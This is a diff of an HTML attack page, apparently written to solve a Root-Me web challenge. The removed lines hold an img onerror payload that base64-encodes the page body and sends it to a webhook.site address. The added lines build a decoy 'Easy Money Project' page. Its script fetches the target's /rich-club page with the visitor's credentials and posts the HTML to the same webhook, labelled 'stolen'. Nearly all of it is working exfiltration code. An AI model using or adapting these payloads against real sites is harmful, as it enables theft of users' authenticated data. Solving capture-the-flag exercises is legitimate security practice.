@@ -1,4 +1,43 @@
-<img
-  src="https://instance-019a183e-f399-712e-acfd-1a4939b3c52d.challenges.root-me.pro/rich-club"
-  onerror="this.src='https://webhook.site/619dc24e-b59e-4424-8632-84b2c38413c5'+btoa(document.body.innerHTML)"
-/>
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>Easy Money Project</h1>
+    <p>Loading your financial future...</p>
+
+    <script>
+      // Attendre que la page charge
+      setTimeout(() => {
+        // Voler le contenu du Rich Club
+        fetch(
+          "https://instance-019a183e-f399-712e-acfd-1a4939b3c52d.challenges.root-me.pro/rich-club",
+          {
+            credentials: "include",
+            mode: "no-cors",
+          }
+        )
+          .then((response) => response.text())
+          .then((html) => {
+            // Envoyer vers le webhook
+            const webhookURL =
+              "https://webhook.site/619dc24e-b59e-4424-8632-84b2c38413c5";
+
+            fetch(webhookURL, {
+              method: "POST",
+              mode: "no-cors",
+              body: JSON.stringify({
+                stolen: html,
+                time: new Date(),
+              }),
+            });
+          })
+          .catch((err) => {
+            // Même en cas d'erreur, essayer d'envoyer quelque chose
+            fetch(
+              "https://webhook.site/619dc24e-b59e-4424-8632-84b2c38413c5?error=" +
+                err
+            );
+          });
+      }, 1000);
+    </script>
+  </body>
+</html>
